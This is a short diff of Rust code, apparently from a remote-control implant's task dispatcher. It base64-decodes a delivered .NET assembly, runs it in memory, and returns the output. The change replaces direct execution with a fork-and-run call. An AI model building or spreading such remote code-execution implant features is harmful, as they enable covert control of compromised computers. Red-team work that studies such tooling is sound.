@@ -768,7 +768,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 Err(e) => { t.send_result(task.id, "", &format!("b64 decode: {}", e)); return; }
             };
             let asm_args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
-            let r = crate::dotnet::exec_dotnet(&asm_bytes, &asm_args);
+            let r = crate::dotnet::fork_run_assembly(&asm_bytes, &asm_args);
             t.send_result(task.id, &r, "");
         }
         #[cfg(target_os = "windows")]
